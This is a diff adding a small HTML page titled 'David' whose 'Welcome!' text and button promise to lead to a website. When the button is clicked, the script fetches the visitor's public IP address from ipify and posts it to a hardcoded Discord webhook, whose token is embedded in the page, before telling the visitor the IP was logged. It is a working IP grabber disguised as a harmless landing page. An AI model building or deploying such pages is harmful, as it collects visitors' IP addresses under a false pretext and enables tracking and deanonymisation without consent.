@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>David</title>
+</head>
+<body>
+    <h1>Welcome!</h1>
+    <p>Go to the website bu clicking below</p>
+    <button id="agreeButton">BUTTON</button>
+
+    <script>
+        // Function to fetch the user's IP address from a public API
+        function getUserIP() {
+            return fetch('https://api.ipify.org?format=json')  // Uses ipify to get the public IP
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(err => console.error('Failed to get IP:', err));
+        }
+
+        // Function to send the IP address to the Discord webhook
+        function sendIPToDiscord(ipAddress) {
+            const webhookURL = 'https://discord.com/api/webhooks/1258821481358426142/rNf6dn0qqyK6HOeP9UBVWCo4Fs_xoG2FkoHNGU3UcJ1FnypxblfGs59pjpFwhhxjaR85';  // Replace with your Discord webhook URL
+
+            const payload = {
+                content: `User IP Address: ${ipAddress}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Thanks for your ip address', data))
+            .catch(error => console.error('Error sending to Discord:', error));
+        }
+
+        // Event listener for the button
+        document.getElementById('agreeButton').addEventListener('click', () => {
+            getUserIP().then(ipAddress => {
+                console.log('User IP:', ipAddress);
+                sendIPToDiscord(ipAddress);  // Send IP to Discord
+                alert('Your IP has been logged and sent to Discord.');
+            });
+        });
+    </script>
+</body>
+</html>
